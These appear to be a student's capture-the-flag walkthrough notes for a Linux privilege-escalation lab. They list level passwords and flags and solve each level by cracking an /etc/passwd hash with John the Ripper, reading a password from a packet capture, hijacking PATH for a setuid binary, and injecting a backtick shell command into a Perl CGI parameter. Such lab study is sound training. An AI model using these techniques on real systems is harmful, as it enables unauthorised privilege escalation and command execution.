```b
level01  x24ti5gi3x0ol2eh4esiuxias
level02  f2av5il02puano7naaf6adaaf
level03  kooda2puivaav1idi4f57q8iq
level04  qi0maab88jeaj46qoumi7maus
level05  ne2searoevaevoem4ov4ar8ap

flag00  nottoohardhere 
flag01  abcdefg
flag02  ft_waNDReL0L
```


# SSH

```b
$ ifconfig
$ ifconfig | grep inet
$ ifconfig | grep 'inet ' | awk 'NR==2'
$ ssh level00@$(ifconfig | grep 'inet ' | awk 'NR==2 {print $2}') -p 4242
```

# 00

Login

```b
> ssh level00@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: level00
```

Ideas

- `ls` `pwd`
  - the folder is empty, we are at `/home/user/level00`
- `id` `whoami` `id flag00`
  - we are level00 
  - another user flag00 has different permissions

Let's compare privileges btw level00 and flag00:

```b
> grep level00 /etc/passwd
level00:x:2000:2000::/home/user/level00:/bin/bash
> grep flag00 /etc/passwd
flag00:x:3000:3000::/home/flag/flag00:/bin/bash
                    ^^^^^^^^^^^^^^^^^ 👈 user home directories stored here
> ls -l /home/user/level00
total 0
> ls -l /home/flag/flag00
ls: cannot open directory /home/flag/flag00: Permission denied
```

Let's check if we have other files outside of Home

```b
> ls -l
> find / -user level00 
> find / -user level00 2>/dev/null
> find / -user flag00 2>/dev/null
> find / -user flag00 -exec cat {} \; 2>/dev/null
OR
> find / -user flag00 -exec cat {} + 2>/dev/null
cdiiddwpgswtgt
cdiiddwpgswtgt
```

- `2>/dev/null` : redir stderr output to `/dev/null`
- `\;` : mark the end of `-exec` and runs `cat` on one file a time
- `/` : from root directory
- `+` : forces `find` to run `cat` on many files at once 


Decipher _`cdiiddwpgswtgt`_ in python

```py
a = ord('a')
for i in range(26):
    print(''.join(chr(a+(ord(c)-a+i)%26) for c in 'cdiiddwpgswtgt'))
```



# 01

Login

```b
> ssh level01@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: x24ti5gi3x0ol2eh4esiuxias
```

Look at `/etc/passwd`

```b
> grep -i flag01 /etc/passwd
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
> grep flag01 /etc/passwd | awk -F: '{print $2}'
42hDRfypTqqnw

### observation
  if we have john as a cli tool we'll able to one of these:
  > john --show <(grep flag01 /etc/passwd | awk -F: '{print $2}')  
  > john --show <(cat /etc/passwd | grep -i flag01 | awk -F: '{print $2}')
```

Download and use `john`

```b
> wget https://download.openwall.net/pub/projects/john/contrib/macosx/john-1.8.0.9-jumbo-macosx_sse4.zip
> tar -xvf john-1.8.0.9-jumbo-macosx_sse4.zip
> cd john-1.8.0.9-jumbo-macosx_sse4
> echo 42hDRfypTqqnw > __test
> ./john __test
> ./john --show __test

OR

> ./do_john.sh
```


# 02

Login

```b
> ssh level02@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: f2av5il02puano7naaf6adaaf
```

New stuff
- `realpath` - get the full absolute filepath
- `scp` - secure copy - `scp username@ip:path _local_`
- `~.pcap` - a Packet Capture to store network packet data captured during network traffic monitoring

Save the `.pcap` to Host
```b
### VM
> ls -l
----r--r-- 1 flag02 level02 level02.pcap
^ which means a regular file

> scp -P 4242 level02@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}'):/home/user/level02/level02.pcap $(pwd)
```

❌ Inspect `.pcap`  

```b
### Host
> hexdump -C level02.pcap 
> xxd level02.pcap 
> xxd level02.pcap | grep -i pass -A10 -B10
> xxd level02.pcap | cut -d ' ' -f2-9 | tr -d ' '
```

✅ Use _Wireshark_ 
- _Analyze - Follow - TCP Stream_ 
- copy _`TCP Stream`_ to text

```b
    000000D6  00 0d 0a 50 61 73 73 77  6f 72 64 3a 20            ...Passw ord: 
000000B9  66                                                 f
000000BA  74                                                 t
000000BB  5f                                                 _
000000BC  77                                                 w
000000BD  61                                                 a
000000BE  6e                                                 n
000000BF  64                                                 d
000000C0  72                                                 r
000000C1  7f                                                 .
000000C2  7f                                                 .
000000C3  7f                                                 .
000000C4  4e                                                 N
000000C5  44                                                 D
000000C6  52                                                 R
000000C7  65                                                 e
000000C8  6c                                                 l
000000C9  7f                                                 .
000000CA  4c                                                 L
000000CB  30                                                 0
000000CC  4c                                                 L
000000CD  0d                                                 .
```

- `7f` - DE
- `0d` - CR

Parse the above block

```py
infile = [[n[-2], n[-1]] for n in [_.split() for _ in open(0).read().split('\n') if len(_.split()) == 3]]
res = ''
for i, line in enumerate(infile):
    print('line/', line, 'i/', i)
    x, c = line
    if x == '7f':
        res = res[:-1]
    elif c != '.':
        res += c
    else:
        assert(x == '0d')
print('res/', res)

# ft_waNDReL0L
```


# 03

Login

```b
> ssh level03@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: kooda2puivaav1idi4f57q8iq
```

Inspect
- ❌ `file` `readelf` `strings` 
- ✅ `ltrace` 

```
> ls -l
-rwsr-sr-x 1 flag03 level03 8627 level03
 ^^^       owner flag03 can rwx also setuid bit is set
    ^^^    group level03 can rx plus setgid bit (s) is set
       ^^^ others can rx

👉 when ./level03 is run
  the entire process runs with owner flag03's priviledges
  ie. I, user level00, can exploit priviledges limited to flag03

👉 conclusion: execute the ./level03 and doing so we gain
  temporary elevated permissions as flag03
```

- We may also try `id` & `namei`

```b
> id
uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)

> namei -l ./level03 
dr-x------ level03 level03 .
-rwsr-sr-x flag03  level03 level03

> namei -l /bin/getflag
-rwxr-xr-x root root getflag
```

- `ltrace` traces library function calls when the binary is executed

```b
> ltrace ./level03
  👉 we can see the `s` bit in action

### output
getegid()                                           = 2003
geteuid()                                           = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me" ...

### observations
👉 getegid & geteuid return a effective group/user ID 2003 
  which is my `id` as `level03`.
👉 Because privileges are elevated during the process
  we have temporary permissions as `flag03`.
👉 This way we can exploit the `/usr/bin/env echo`
  relative path vulnerability.
```

- Solution

```b
> whereis getflag
getflag: /bin/getflag
> echo -e "#\!/bin/bash\n/bin/getflag" > /tmp/echo
> chmod +x /tmp/echo
> export PATH=/tmp:$PATH  👈 prepend tmp to get it checked first
> ./level03
```


# 04 

Login

```b
> ssh level04@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: qi0maab88jeaj46qoumi7maus
```

We have a script and maybe it interacts w/ a webpage:

```pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
  # CGI (Common Gateway Interface)
  # param: a CGI module func fetches params from HTTP requests
  # qw: quote words
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
  # sub -- define subroutine x
  # $_[0] -- subroutine `x()` takes a single arg`
  # print w/ backticks invokes a shell command
  # 2>&1 -- combine stdout and stderr, & means 1 is a fd not a filename
}
x(param("x"));
  # 1st `x` : calling the subroutine
  # 2nd `x` : a query param
  # x comes in form of "...?x=getflag"
```

Solution

```b
> nc -vz localhost 4747
      ^ v: verbose
        z: scan if a port is open (scanning listening daemons)
Connection to localhost 4747 port [tcp/*] succeeded!

> curl localhost:4747/?x="\`/bin/getflag\`"
```


# 05 - Todo: `/var/mail` `cronjob`


# 06 - Todo: `php` `regex`


# 07 - Todo: `ltrace` again

